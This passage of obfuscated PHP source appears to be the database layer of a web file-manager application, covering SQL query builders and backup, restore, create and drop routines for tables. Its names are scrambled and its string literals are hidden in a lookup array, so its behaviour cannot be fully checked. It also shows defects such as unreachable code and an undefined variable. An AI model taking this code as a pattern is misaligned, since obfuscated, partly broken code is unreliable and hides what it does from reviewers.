$¯´êë[1129]; } $‹¡Ï = array(); foreach ($µë¾à°å as $Ÿ½Ô‡£è => $àä’í÷Â) { $‹¡Ï[] = $this->parseKey($Ÿ½Ô‡£è) . $¯´êë[1147] . $this->parseValue($àä’í÷Â); } $·¹Ñ‰ÅÂ = implode($­ä´¹‡ò, $‹¡Ï); break; } return $·¹Ñ‰ÅÂ; } protected function parseLimit($£Í­’œÁ) { $‘ö§Áó =& $_SERVER[¬ÏÕ§Áú]; return !empty($£Í­’œÁ) ? $‘ö§Áó[51] . $£Í­’œÁ . $‘ö§Áó[53] : $‘ö§Áó[12]; } protected function parseJoin($ ÷£“Ğ›) { $ıüÇªŒ¼ =& $_SERVER[¬ÏÕ§Áú]; $˜ÈÈŒ¯Á = $ıüÇªŒ¼[12]; if (!empty($ ÷£“Ğ›)) { if (is_array($ ÷£“Ğ›)) { foreach ($ ÷£“Ğ› as $Æ“­œ±Û => $Â¯—´) { if (!1 !== stripos($Â¯—´, $ıüÇªŒ¼[1149])) { $˜ÈÈŒ¯Á .= $ıüÇªŒ¼[53] . $Â¯—´; } else { $˜ÈÈŒ¯Á .= $ıüÇªŒ¼[1150] . $Â¯—´; } } } else { $˜ÈÈŒ¯Á .= $ıüÇªŒ¼[1150] . $ ÷£“Ğ›; } } $˜ÈÈŒ¯Á = preg_replace($ıüÇªŒ¼[1151], think_config($ıüÇªŒ¼[1055]) . $ıüÇªŒ¼[1152], $˜ÈÈŒ¯Á); return $˜ÈÈŒ¯Á; } protected function parseOrder($÷ğ¤ƒ÷ä) { $óÂ´äî« =& $_SERVER[¬ÏÕ§Áú]; if (is_array($÷ğ¤ƒ÷ä)) { $ç„û”¡Ô = array(); foreach ($÷ğ¤ƒ÷ä as $¼¬Ëšª => $ÌÒÃÜĞ) { if (is_numeric($¼¬Ëšª)) { $ç„û”¡Ô[] = $this->parseKey($ÌÒÃÜĞ); } else { $ÌÒÃÜĞ = in_array(strtoupper(trim($ÌÒÃÜĞ)), array($óÂ´äî«[1153], $óÂ´äî«[1154])) ? $óÂ´äî«[53] . $ÌÒÃÜĞ : $óÂ´äî«[12]; if (preg_match($óÂ´äî«[1155], $¼¬Ëšª)) { $ç„û”¡Ô[] = $this->parseKey($¼¬Ëšª) . $ÌÒÃÜĞ; } else { think_exception($óÂ´äî«[1156] . $¼¬Ëšª); } } } $÷ğ¤ƒ÷ä = implode($óÂ´äî«[50], $ç„û”¡Ô); } return !empty($÷ğ¤ƒ÷ä) ? $óÂ´äî«[1157] . $÷ğ¤ƒ÷ä : $óÂ´äî«[12]; } protected function parseGroup($’ê€¨Ëæ) { $ÊºÉ³‡ö =& $_SERVER[¬ÏÕ§Áú]; return !empty($’ê€¨Ëæ) ? $ÊºÉ³‡ö[1158] . $’ê€¨Ëæ : $ÊºÉ³‡ö[12]; } protected function parseHaving($½±õßû¼) { $âòÎğ»Í =& $_SERVER[¬ÏÕ§Áú]; return !empty($½±õßû¼) ? $âòÎğ»Í[1159] . $½±õßû¼ : $âòÎğ»Í[12]; } protected function parseComment($¼óêû™) { $ˆÀÚ¿Èæ =& $_SERVER[¬ÏÕ§Áú]; return !empty($¼óêû™) ? $ˆÀÚ¿Èæ[1160] . $¼óêû™ . $ˆÀÚ¿Èæ[1161] : $ˆÀÚ¿Èæ[12]; } protected function parseDistinct($Ì”ËŸ¶Ñ) { $—é”¢˜¾ =& $_SERVER[¬ÏÕ§Áú]; return !empty($Ì”ËŸ¶Ñ) ? $—é”¢˜¾[1162] : $—é”¢˜¾[12]; } protected function parseUnion($›æ¬ÂÀÊ) { $îì‡ˆ®Ñ =& $_SERVER[¬ÏÕ§Áú]; if (empty($›æ¬ÂÀÊ)) { return $îì‡ˆ®Ñ[12]; } if (isset($›æ¬ÂÀÊ[$îì‡ˆ®Ñ[434]])) { $•“ªµĞ = $îì‡ˆ®Ñ[1163]; unset($›æ¬ÂÀÊ[$îì‡ˆ®Ñ[434]]); } else { $•“ªµĞ = $îì‡ˆ®Ñ[1164]; } foreach ($›æ¬ÂÀÊ as $İ¯Óƒ‚) { $Š”©ä¼Â[] = $•“ªµĞ . (is_array($İ¯Óƒ‚) ? $this->buildSelectSql($İ¯Óƒ‚) : $İ¯Óƒ‚); } return implode($îì‡ˆ®Ñ[53], $Š”©ä¼Â); } public function insert($şÍİÂ­Ö, $æ®÷ÃûÕ = array(), $áÓ²ÀÇ = false) { $ƒã…ô œ =& $_SERVER[¬ÏÕ§Áú]; $Ù”±ş¶¯ = $üÌ³öí = array(); $this->model = $æ®÷ÃûÕ[$ƒã…ô œ[370]]; foreach ($şÍİÂ­Ö as $Š‡ÑÀ½¶ => $‚÷åşì) { if (is_array($‚÷åşì) && $ƒã…ô œ[383] == $‚÷åşì[0]) { $üÌ³öí[] = $this->parseKey($Š‡ÑÀ½¶); $Ù”±ş¶¯[] = $‚÷åşì[1]; } elseif (is_scalar($‚÷åşì) || is_null($‚÷åşì)) { $üÌ³öí[] = $this->parseKey($Š‡ÑÀ½¶); $Ù”±ş¶¯[] = $this->parseValue($‚÷åşì); } } $ùØ½Å = ($áÓ²ÀÇ ? $ƒã…ô œ[1029] : $ƒã…ô œ[1030]) . $ƒã…ô œ[1031] . $this->parseTable($æ®÷ÃûÕ[$ƒã…ô œ[368]]) . $ƒã…ô œ[1025] . implode($ƒã…ô œ[50], $üÌ³öí) . $ƒã…ô œ[1026] . implode($ƒã…ô œ[50], $Ù”±ş¶¯) . $ƒã…ô œ[1027]; $ùØ½Å .= $this->parseLock(isset($æ®÷ÃûÕ[$ƒã…ô œ[968]]) ? $æ®÷ÃûÕ[$ƒã…ô œ[968]] : !1); $ùØ½Å .= $this->parseComment(!empty($æ®÷ÃûÕ[$ƒã…ô œ[440]]) ? $æ®÷ÃûÕ[$ƒã…ô œ[440]] : $ƒã…ô œ[12]); return $this->execute($ùØ½Å, $this->parseBind(!empty($æ®÷ÃûÕ[$ƒã…ô œ[372]]) ? $æ®÷ÃûÕ[$ƒã…ô œ[372]] : array())); } public function selectInsert($ÌœÚİš…, $Ç€Õ¼, $¬Òö“úÙ = array()) { $áØİ«® =& $_SERVER[¬ÏÕ§Áú]; $this->model = $¬Òö“úÙ[$áØİ«®[370]]; if (is_string($ÌœÚİš…)) { $ÌœÚİš… = explode($áØİ«®[50], $ÌœÚİš…); } array_walk($ÌœÚİš…, array($this, $áØİ«®[1028])); $šÓö³½ò = $áØİ«®[1165] . $this->parseTable($Ç€Õ¼) . $áØİ«®[1025] . implode($áØİ«®[50], $ÌœÚİš…) . $áØİ«®[1143]; $šÓö³½ò .= $this->buildSelectSql($¬Òö“úÙ); return $this->execute($šÓö³½ò, $this->parseBind(!empty($¬Òö“úÙ[$áØİ«®[372]]) ? $¬Òö“úÙ[$áØİ«®[372]] : array())); } public function update($”êëİÕ, $÷€˜¡”È) { $‘ú–áİì =& $_SERVER[¬ÏÕ§Áú]; $this->model = $÷€˜¡”È[$‘ú–áİì[370]]; $” ßöï = $‘ú–áİì[1166] . $this->parseTable($÷€˜¡”È[$‘ú–áİì[368]]) . $this->parseSet($”êëİÕ) . $this->parseWhere(!empty($÷€˜¡”È[$‘ú–áİì[364]]) ? $÷€˜¡”È[$‘ú–áİì[364]] : $‘ú–áİì[12]) . $this->parseOrder(!empty($÷€˜¡”È[$‘ú–áİì[452]]) ? $÷€˜¡”È[$‘ú–áİì[452]] : $‘ú–áİì[12]) . $this->parseLimit(!empty($÷€˜¡”È[$‘ú–áİì[379]]) ? $÷€˜¡”È[$‘ú–áİì[379]] : $‘ú–áİì[12]) . $this->parseLock(isset($÷€˜¡”È[$‘ú–áİì[968]]) ? $÷€˜¡”È[$‘ú–áİì[968]] : !1) . $this->parseComment(!empty($÷€˜¡”È[$‘ú–áİì[440]]) ? $÷€˜¡”È[$‘ú–áİì[440]] : $‘ú–áİì[12]); return $this->execute($” ßöï, $this->parseBind(!empty($÷€˜¡”È[$‘ú–áİì[372]]) ? $÷€˜¡”È[$‘ú–áİì[372]] : array())); } public function delete($´¡àéÄ = array()) { $ÉÁ£‡­Î =& $_SERVER[¬ÏÕ§Áú]; $this->model = $´¡àéÄ[$ÉÁ£‡­Î[370]]; $úÂµƒÍ³ = $ÉÁ£‡­Î[1167] . $this->parseTable($´¡àéÄ[$ÉÁ£‡­Î[368]]) . $this->parseWhere(!empty($´¡àéÄ[$ÉÁ£‡­Î[364]]) ? $´¡àéÄ[$ÉÁ£‡­Î[364]] : $ÉÁ£‡­Î[12]) . $this->parseOrder(!empty($´¡àéÄ[$ÉÁ£‡­Î[452]]) ? $´¡àéÄ[$ÉÁ£‡­Î[452]] : $ÉÁ£‡­Î[12]) . $this->parseLimit(!empty($´¡àéÄ[$ÉÁ£‡­Î[379]]) ? $´¡àéÄ[$ÉÁ£‡­Î[379]] : $ÉÁ£‡­Î[12]) . $this->parseLock(isset($´¡àéÄ[$ÉÁ£‡­Î[968]]) ? $´¡àéÄ[$ÉÁ£‡­Î[968]] : !1) . $this->parseComment(!empty($´¡àéÄ[$ÉÁ£‡­Î[440]]) ? $´¡àéÄ[$ÉÁ£‡­Î[440]] : $ÉÁ£‡­Î[12]); return $this->execute($úÂµƒÍ³, $this->parseBind(!empty($´¡àéÄ[$ÉÁ£‡­Î[372]]) ? $´¡àéÄ[$ÉÁ£‡­Î[372]] : array())); } public function select($İ‡œ§´Ï = array()) { $‹ÏÜşÁõ =& $_SERVER[¬ÏÕ§Áú]; $this->model = $İ‡œ§´Ï[$‹ÏÜşÁõ[370]]; $ïÙÙÎÔ€ = $this->buildSelectSql($İ‡œ§´Ï); $ÁÑ¯¸ê¦ = isset($İ‡œ§´Ï[$‹ÏÜşÁõ[435]]) ? $İ‡œ§´Ï[$‹ÏÜşÁõ[435]] : !1; if ($ÁÑ¯¸ê¦) { $ığÁšŠô = is_string($ÁÑ¯¸ê¦[$‹ÏÜşÁõ[107]]) ? $ÁÑ¯¸ê¦[$‹ÏÜşÁõ[107]] : $‹ÏÜşÁõ[1168] . md5($ïÙÙÎÔ€); $²àš†¶¢ = think_cache($ığÁšŠô, $‹ÏÜşÁõ[12], $ÁÑ¯¸ê¦); if (!1 !== $²àš†¶¢) { return $²àš†¶¢; } } $«‚…œ·´ = $this->query($ïÙÙÎÔ€, $this->parseBind(!empty($İ‡œ§´Ï[$‹ÏÜşÁõ[372]]) ? $İ‡œ§´Ï[$‹ÏÜşÁõ[372]] : array())); if ($ÁÑ¯¸ê¦ && !1 !== $«‚…œ·´) { think_cache($ığÁšŠô, $«‚…œ·´, $ÁÑ¯¸ê¦); } return $«‚…œ·´; } public function buildSelectSql($‘÷ª’• = array()) { $ìŠşæšã =& $_SERVER[¬ÏÕ§Áú]; if (isset($‘÷ª’•[$ìŠşæšã[439]])) { if (strpos($‘÷ª’•[$ìŠşæšã[439]], $ìŠşæšã[50])) { list($Ò¨ıë‰·, $æä÷Øíõ) = explode($ìŠşæšã[50], $‘÷ª’•[$ìŠşæšã[439]]); } else { $Ò¨ıë‰· = $‘÷ª’•[$ìŠşæšã[439]]; } $Ò¨ıë‰· = $Ò¨ıë‰· ? $Ò¨ıë‰· : 1; $æä÷Øíõ = isset($æä÷Øíõ) ? $æä÷Øíõ : (is_numeric($‘÷ª’•[$ìŠşæšã[379]]) ? $‘÷ª’•[$ìŠşæšã[379]] : 20); $ˆ¥ß±ˆÒ = $æä÷Øíõ * ((int) $Ò¨ıë‰· - 1); $‘÷ª’•[$ìŠşæšã[379]] = $ˆ¥ß±ˆÒ . $ìŠşæšã[50] . $æä÷Øíõ; } if (think_config($ìŠşæšã[1169])) { $–Öäã® = $ìŠşæšã[1170] . md5(serialize($‘÷ª’•)); $·üÏŒ÷— = think_cache($–Öäã®); if ($·üÏŒ÷—) { return $·üÏŒ÷—; } } $¶•°¥‡Æ = $this->parseSql($this->selectSql, $‘÷ª’•); $¶•°¥‡Æ .= $this->parseLock(isset($‘÷ª’•[$ìŠşæšã[968]]) ? $‘÷ª’•[$ìŠşæšã[968]] : !1); if (isset($–Öäã®)) { think_cache($–Öäã®, $¶•°¥‡Æ); } return $¶•°¥‡Æ; } public function parseSql($Â€ß§Ç¨, $£®±€Šš = array()) { $·İ•«çğ =& $_SERVER[¬ÏÕ§Áú]; $Â€ß§Ç¨ = str_replace(array($·İ•«çğ[1171], $·İ•«çğ[1172], $·İ•«çğ[1173], $·İ•«çğ[1174], $·İ•«çğ[1175], $·İ•«çğ[1176], $·İ•«çğ[1177], $·İ•«çğ[1178], $·İ•«çğ[1179], $·İ•«çğ[1180], $·İ•«çğ[1181]), array($this->parseTable("{$£®±€Šš[$·İ•«çğ[368]]}"), $this->parseDistinct(isset($£®±€Šš[$·İ•«çğ[1182]]) ? $£®±€Šš[$·İ•«çğ[1182]] : !1), $this->parseField(!empty($£®±€Šš[$·İ•«çğ[362]]) ? $£®±€Šš[$·İ•«çğ[362]] : $·İ•«çğ[233]), $this->parseJoin(!empty($£®±€Šš[$·İ•«çğ[371]]) ? $£®±€Šš[$·İ•«çğ[371]] : $·İ•«çğ[12]), $this->parseWhere(!empty($£®±€Šš[$·İ•«çğ[364]]) ? $£®±€Šš[$·İ•«çğ[364]] : $·İ•«çğ[12]), $this->parseGroup(!empty($£®±€Šš[$·İ•«çğ[599]]) ? $£®±€Šš[$·İ•«çğ[599]] : $·İ•«çğ[12]), $this->parseHaving(!empty($£®±€Šš[$·İ•«çğ[1183]]) ? $£®±€Šš[$·İ•«çğ[1183]] : $·İ•«çğ[12]), $this->parseOrder(!empty($£®±€Šš[$·İ•«çğ[452]]) ? $£®±€Šš[$·İ•«çğ[452]] : $·İ•«çğ[12]), $this->parseLimit(!empty($£®±€Šš[$·İ•«çğ[379]]) ? $£®±€Šš[$·İ•«çğ[379]] : $·İ•«çğ[12]), $this->parseUnion(!empty($£®±€Šš[$·İ•«çğ[433]]) ? $£®±€Šš[$·İ•«çğ[433]] : $·İ•«çğ[12]), $this->parseComment(!empty($£®±€Šš[$·İ•«çğ[440]]) ? $£®±€Šš[$·İ•«çğ[440]] : $·İ•«çğ[12])), $Â€ß§Ç¨); return $Â€ß§Ç¨; } public function getLastSql($­¨‘±¶Î = '') { return $­¨‘±¶Î ? $this->modelSql[$­¨‘±¶Î] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($ìùÑûÙâ) { return addslashes($ìùÑûÙâ); } public function setModel($Ê ›àÅŞ) { $this->model = $Ê ›àÅŞ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($Î»†øÅÍ = array()) { $í’‚Ê„­ =& $_SERVER[¬ÏÕ§Áú]; if (empty($Î»†øÅÍ)) { $Î»†øÅÍ = $GLOBALS[$í’‚Ê„­[6]][$í’‚Ê„­[21]]; } $this->database = $Î»†øÅÍ; } public function model($±¬Ó‘¤ = '') { return new ModelBase($±¬Ó‘¤, $_SERVER[¬ÏÕ§Áú][12], $this->database); } public function db($Ç¸çÁŸÇ = false) { $÷·Óû–õ =& $_SERVER[¬ÏÕ§Áú]; $Ûêæ•‚ = array_change_key_case($this->database); if ($this->dbType() == $÷·Óû–õ[13] || !$Ç¸çÁŸÇ) { return $this->model()->db(); } $ñŒØÙ›ú = $Ûêæ•‚[$÷·Óû–õ[1097]]; $Ûêæ•‚[$÷·Óû–õ[1097]] = $÷·Óû–õ[12]; if ($Ûêæ•‚[$÷·Óû–õ[1092]] == $÷·Óû–õ[1089]) { $éŸÑßÃ× = $Ûêæ•‚[$÷·Óû–õ[1098]]; $Ûêæ•‚[$÷·Óû–õ[1098]] = substr($éŸÑßÃ×, 0, strrpos($éŸÑßÃ×, $÷·Óû–õ[1184])); } $this->database = $Ûêæ•‚; $¯×Û£ØÂ = $this->model()->db(); try { $§¶ˆüĞû = $¯×Û£ØÂ->execute("\163\150\x6f\x77\x20\x64\141\x74\141\142\x61\163\x65\163\40\x6c\x69\153\145\40\47{$ñŒØÙ›ú}\x27"); } catch (Exception $­ŒÄ‡ŠÆ) { } if (!$§¶ˆüĞû) { $¯×Û£ØÂ->execute("\x63\162\x65\x61\x74\145\40\144\141\164\141\142\141\163\145\x20\140{$ñŒØÙ›ú}\x60"); } $Ûêæ•‚[$÷·Óû–õ[1097]] = $ñŒØÙ›ú; if ($Ûêæ•‚[$÷·Óû–õ[1092]] == $÷·Óû–õ[1089]) { $Ûêæ•‚[$÷·Óû–õ[1098]] .= $÷·Óû–õ[1184] . $ñŒØÙ›ú; } $this->database = $Ûêæ•‚; $¯×Û£ØÂ->execute("\x75\x73\145\x20\140{$ñŒØÙ›ú}\x60"); return $¯×Û£ØÂ; } public function createTable($í³ÍôŒ„, &$ÈÊÉö¿È) { $ĞáãÈ×« =& $_SERVER[¬ÏÕ§Áú]; if (!IO::exist($í³ÍôŒ„)) { ActionCall($ĞáãÈ×«[1185], !0, 0); show_json(LNG($ĞáãÈ×«[1186]), !1); } $¢†Ø„§™ = $this->model()->db(); $®á‹­ı• = sqlSplit(IO::getContent($í³ÍôŒ„)); foreach ($®á‹­ı• as $Ö±—ƒ) { $ààÎ«‰ = stripos($Ö±—ƒ, $ĞáãÈ×«[1187]) === 0; if ($ààÎ«‰) { $ÈÊÉö¿È->task[$ĞáãÈ×«[1188]] += 1; } $¢†Ø„§™->execute($Ö±—ƒ); if ($ààÎ«‰) { preg_match($ĞáãÈ×«[1189], $Ö±—ƒ, $Û„ƒÃó£); $ÈÊÉö¿È->task[$ĞáãÈ×«[1190]] = $Û„ƒÃó£[1]; $ÈÊÉö¿È->update(1); } } } public function insertTable($ÒÖïœ«, &$³œÃÚ´§) { $ªİİÄÔ =& $_SERVER[¬ÏÕ§Áú]; $Â‘Æ¾°˜ = $this->model()->db(); $¶í…ùÃÅ = $Ô³š÷Ã× ? array($Ô³š÷Ã×) : $Â‘Æ¾°˜->getTables(); foreach ($ÒÖïœ« as $æØã¿) { $Ô³š÷Ã× = basename($æØã¿, $ªİİÄÔ[906]); if (!in_array($Ô³š÷Ã×, $¶í…ùÃÅ)) { continue; } $³œÃÚ´§->task[$ªİİÄÔ[1190]] = $Ô³š÷Ã×; if (get_filesize($æØã¿) == 0) { continue; } $±…šììÜ = $this->sqlToDb($æØã¿, $³œÃÚ´§); if (!$±…šììÜ) { ActionCall($ªİİÄÔ[1185], !0, 0); show_json(LNG($ªİİÄÔ[1191]) . "\133{$Ô³š÷Ã×}\x5d", !1); } } } public function sqlFromDb($­½­‰•š, $İÖÃñæø, &$ÈÙñöº, $İóÄ—´À = '') { if ($ÈÙñöº) { $ÈÙñöº->task[$_SERVER[¬ÏÕ§Áú][1190]] = $­½­‰•š; } $±è¯óÃ€ = $this->model($­½­‰•š); $äŸˆö… = 0; $Ø¢Ôîğ = 0; $âÆ–›İı = 10000; $øÄ¯‰äú = fopen($İÖÃñæø, $_SERVER[¬ÏÕ§Áú][1192]); $íÙöµä¦ = $±è¯óÃ€->getPk(); $Ñ¨³ú‰ = $±è¯óÃ€->getDbFields(); $Ÿä§±® = $_SERVER[¬ÏÕ§Áú][12]; if ($GLOBALS[$_SERVER[¬ÏÕ§Áú][905]] && in_array($­½­‰•š, array($_SERVER[¬ÏÕ§Áú][1193], $_SERVER[¬ÏÕ§Áú][1194]))) { $Ÿä§±® = $­½­‰•š; } do { $úÉÕÁ•Å = array($íÙöµä¦ => array($_SERVER[¬ÏÕ§Áú][1139], $Ø¢Ôîğ)); $ÉÆ®Õ›Ş = $±è¯óÃ€->where($úÉÕÁ•Å)->field($Ñ¨³ú‰)->order($íÙöµä¦ . $_SERVER[¬ÏÕ§Áú][1195])->limit($âÆ–›İı)->select(); $ÉÆ®Õ›Ş = !empty($ÉÆ®Õ›Ş) ? $ÉÆ®Õ›Ş : array(); if (!($”Å²Ì´Ù = count($ÉÆ®Õ›Ş))) { break; } $—úİßå = end($ÉÆ®Õ›Ş); $Ø¢Ôîğ = $—úİßå[$íÙöµä¦]; $è¹Øˆ™ = array(); foreach ($ÉÆ®Õ›Ş as $Ş‡ªÚ) { if ($Ÿä§±®) { if ($­½­‰•š == $_SERVER[¬ÏÕ§Áú][1193]) { if ($Ş‡ªÚ[$_SERVER[¬ÏÕ§Áú][33]] == $_SERVER[¬ÏÕ§Áú][1196]) { $†öş…¸ = json_decode($Ş‡ªÚ[$_SERVER[¬ÏÕ§Áú][461]], !0); if ($†öş…¸[$_SERVER[¬ÏÕ§Áú][32]] == $GLOBALS[$_SERVER[¬ÏÕ§Áú][905]] && $†öş…¸[$_SERVER[¬ÏÕ§Áú][863]] != 1) { continue; } } } else { if ($Ş‡ªÚ[$_SERVER[¬ÏÕ§Áú][33]] == $_SERVER[¬ÏÕ§Áú][1197] && $Ş‡ªÚ[$_SERVER[¬ÏÕ§Áú][107]] == $_SERVER[¬ÏÕ§Áú][901]) { continue; } } } if ($İóÄ—´À) { $Ş‡ªÚ[$_SERVER[¬ÏÕ§Áú][97]] = "\173\x69\157\72{$İóÄ—´À}\175" . substr($Ş‡ªÚ[$_SERVER[¬ÏÕ§Áú][97]], strlen("\173\x69\157\x3a{$Ş‡ªÚ[$_SERVER[¬ÏÕ§Áú][939]]}\175")); $Ş‡ªÚ[$_SERVER[¬ÏÕ§Áú][939]] = $İóÄ—´À; } $è¹Øˆ™[] = $_SERVER[¬ÏÕ§Áú][1198] . $this->sqlEncode($Ş‡ªÚ) . $_SERVER[¬ÏÕ§Áú][1199]; } $öƒµâı = "\111\x4e\x53\x45\122\124\40\x49\116\x54\117\40\x60{$­½­‰•š}\x60\x20\x28\x60" . implode($_SERVER[¬ÏÕ§Áú][1200], $Ñ¨³ú‰) . $_SERVER[¬ÏÕ§Áú][1201]; fwrite($øÄ¯‰äú, $öƒµâı . implode($_SERVER[¬ÏÕ§Áú][1202], $è¹Øˆ™) . $_SERVER[¬ÏÕ§Áú][84] . PHP_EOL); $äŸˆö… += $”Å²Ì´Ù; if ($ÈÙñöº) { $ÈÙñöº->update($”Å²Ì´Ù); } } while ($âÆ–›İı == $”Å²Ì´Ù); fclose($øÄ¯‰äú); return $äŸˆö…; } public function sqlToDb($’ÄÅí¸†, &$òø×ÈâÕ) { $ì¢®ÏœÍ =& $_SERVER[¬ÏÕ§Áú]; $§õ¾›ĞÑ = $this->model()->db(); $“‹¶ÔÃ— = @fopen($’ÄÅí¸†, $ì¢®ÏœÍ[1203]); if (!$“‹¶ÔÃ—) { return !1; } $‰¶æÓ€¸ = 0; $€Å–ŠìÅ = $ì¢®ÏœÍ[12]; $¹é‘ Ğš = array(); $¨áßóŠ = $this->dbType(); $Ù¤êŸÀ’ = $¨áßóŠ == $ì¢®ÏœÍ[13] ? 500 : 2000; $¥¨˜ ôœ = basename($’ÄÅí¸†, $ì¢®ÏœÍ[906]); $É·ŞøÒâ = 0; $—„ç²î· = 4194304; while (!feof($“‹¶ÔÃ—)) { $ö•º¨÷ã = trim(fgets($“‹¶ÔÃ—)); if (!$ö•º¨÷ã) { continue; } $Ø¤ÈùØ = $this->sqlDecode($ö•º¨÷ã, $¨áßóŠ, $¥¨˜ ôœ); if (stripos($Ø¤ÈùØ, $ì¢®ÏœÍ[441]) === 0) { if (!$€Å–ŠìÅ) { $€Å–ŠìÅ = $Ø¤ÈùØ . $ì¢®ÏœÍ[53]; } continue; } if ($òø×ÈâÕ) { $òø×ÈâÕ->task[$ì¢®ÏœÍ[1188]] += 1; } $‰¶æÓ€¸++; $¹é‘ Ğš[] = rtrim(rtrim(trim($Ø¤ÈùØ), $ì¢®ÏœÍ[50]), $ì¢®ÏœÍ[84]); $ª‹ƒñ˜Ğ = null; $²ÜÎ€•÷ = strlen($Ø¤ÈùØ); $É·ŞøÒâ += $²ÜÎ€•÷; $İ¶²‡¤ó = strlen($€Å–ŠìÅ) + $É·ŞøÒâ + (count($¹é‘ Ğš) - 1); if ($İ¶²‡¤ó >= $—„ç²î·) { $ª‹ƒñ˜Ğ = array_pop($¹é‘ Ğš); if ($‰¶æÓ€¸ > 1) { $‰¶æÓ€¸--; } } if ($‰¶æÓ€¸ >= $Ù¤êŸÀ’ || $ª‹ƒñ˜Ğ) { $Ø¤ÈùØ = $€Å–ŠìÅ . implode($ì¢®ÏœÍ[50], $¹é‘ Ğš); if (!$§õ¾›ĞÑ->execute($Ø¤ÈùØ)) { return !1; } if ($òø×ÈâÕ) { $òø×ÈâÕ->update($‰¶æÓ€¸); } $¹é‘ Ğš = array(); $‰¶æÓ€¸ = 0; $É·ŞøÒâ = 0; if ($ª‹ƒñ˜Ğ) { $¹é‘ Ğš = array($ª‹ƒñ˜Ğ); $‰¶æÓ€¸ = 1; $É·ŞøÒâ = $²ÜÎ€•÷; } } } fclose($“‹¶ÔÃ—); if (!empty($¹é‘ Ğš)) { $Ø¤ÈùØ = $€Å–ŠìÅ . implode($ì¢®ÏœÍ[50], $¹é‘ Ğš); if (!$§õ¾›ĞÑ->execute($Ø¤ÈùØ)) { return !1; } if ($òø×ÈâÕ) { $òø×ÈâÕ->update($‰¶æÓ€¸); } } return !0; } public function dropTable($ÁõÌå¥ê = null) { $”«²óÓÌ =& $_SERVER[¬ÏÕ§Áú]; $”š” = $this->model()->db(); $‚î©ìŠ½ = $ÁõÌå¥ê ? array($ÁõÌå¥ê) : $”š”->getTables(); if (!$‚î©ìŠ½) { return; } foreach ($‚î©ìŠ½ as $ÁõÌå¥ê) { if ($ÁõÌå¥ê) { $ÁõÌå¥ê = strtolower($ÁõÌå¥ê); } else { continue; } $”š”->execute($”«²óÓÌ[1204] . $this->escapeName($ÁõÌå¥ê) . $”«²óÓÌ[1205]); } } private function sqlEncode($¶ïÏÒ‰…) { $­äô¦µ =& $_SERVER[¬ÏÕ§Áú]; $Ó¸ëÚï¢ = array(); foreach ($¶ïÏÒ‰… as $éÒÚ÷®) { if (is_array($éÒÚ÷®)) { $éÒÚ÷® = json_encode_force($éÒÚ÷®); } $éÒÚ÷® = addslashes($éÒÚ÷®); $éÒÚ÷® = str_replace(array($­äô¦µ[1206], $­äô¦µ[65], $­äô¦µ[428]), array($­äô¦µ[1207], $­äô¦µ[1208], $­äô¦µ[1209]), $éÒÚ÷®); $Ó¸ëÚï¢[] = $éÒÚ÷®; } return $­äô¦µ[58] . implode($­äô¦µ[1210], $Ó¸ëÚï¢) . $­äô¦µ[58]; } private function sqlDecode($Å¨óàª, $Œü¸£¿Ì, $™¯ÚüŞ„ = '') { $ÄŸÏ—á¹ =& $_SERVER[¬ÏÕ§Áú]; $Å¨óàª = str_replace(array($ÄŸÏ—á¹[1207], $ÄŸÏ—á¹[1208], $ÄŸÏ—á¹[1209]), array($ÄŸÏ—á¹[1206], $ÄŸÏ—á¹[65], $ÄŸÏ—á¹[428]), $Å¨óàª); if ($Œü¸£¿Ì == $ÄŸÏ—á¹[13]) { $Å¨óàª = str_ireplace($ÄŸÏ—á¹[1211], $ÄŸÏ—á¹[59], $Å¨óàª); $Å¨óàª = stripslashes($Å¨óàª); } return preg_replace($ÄŸÏ—á¹[1212], $ÄŸÏ—á¹[12], $Å¨óàª); if ($Œü¸£¿Ì == $ÄŸÏ—á¹[13]) { return $™¯ÚüŞ„ != $ÄŸÏ—á¹[900] ? stripslashes($Å¨óàª) : $Å¨óàª; } if ($™¯ÚüŞ„ == $ÄŸÏ—á¹[900]) { $Å¨óàª = str_replace($ÄŸÏ—á¹[1213], $ÄŸÏ—á¹[131], stripslashes($Å¨óàª)); } return $Å¨óàª; } public function getSqlFile($ƒÆÒ¢Š = '') { $®×€Úäê =& $_SERVER[¬ÏÕ§Áú]; $ßÖ—òÑÓ = $this->dbType(!0); $ôÍ¥·È… = CONTROLLER_DIR . "\151\x6e\163\x74\141\x6c\x6c\57\144\141\164\141\x2f{$ßÖ—òÑÓ}\56\163\x71\x6c"; if (!file_exists($ôÍ¥·È…)) { return !1; } $´ı‹á«ñ = file_get_contents($ôÍ¥·È…); $”İÛ¥Ó× = $®×€Úäê[1214] . ($ßÖ—òÑÓ == $®×€Úäê[924] ? $®×€Úäê[1215] : $®×€Úäê[1216]) . $®×€Úäê[1217]; preg_match_all($”İÛ¥Ó×, $´ı‹á«ñ, $èş¦®ÈÄ); $”Ú²¯¬Ò = $èş¦®ÈÄ[1]; $·Ğ€Ùõš = $this->model()->db(); $«åî–• = $·Ğ€Ùõš->getTables(); $«»Ãİß = TEMP_FILES . $®×€Úäê[1218] . date($®×€Úäê[272]) . $®×€Úäê[8]; del_dir($«»Ãİß); mk_dir($«»Ãİß); $ÄóÕÊçç = $«»Ãİß . $®×€Úäê[1219]; $õ¯Û“ Â = $«»Ãİß . $®×€Úäê[1220]; $ìù»Ú‘Ã = $ßÖ—òÑÓ == $®×€Úäê[13] ? $®×€Úäê[924] : $®×€Úäê[13]; IO::copy(CONTROLLER_DIR . "\x69\156\x73\164\141\x6c\x6c\x2f\144\141\164\x61\57{$ìù»Ú‘Ã}\x2e\163\161\154", $«»Ãİß); @touch($«»Ãİß . $ßÖ—òÑÓ . $®×€Úäê[906]); $¬Á÷â¿û = fopen($ÄóÕÊçç, $®×€Úäê[1192]); $É±±„¾• = fopen($õ¯Û“ Â, $®×€Úäê[1192]); if ($ßÖ—òÑÓ == $®×€Úäê[13]) { $«åî–• = array_diff($«åî–•, array($®×€Úäê[898], $®×€Úäê[899])); $“××ª’ë = array($®×€Úäê[1221], $®×€Úäê[1222], $®×€Úäê[1223]); fwrite($É±±„¾•, implode(PHP_EOL, $“××ª’ë) . PHP_EOL . PHP_EOL); foreach ($«åî–• as $í“Ä·°ö) { $šÏÊ÷¾ş = $this->sqlFromSqlite($í“Ä·°ö); if (!$šÏÊ÷¾ş[$®×€Úäê[13]]) { continue; } fwrite($É±±„¾•, 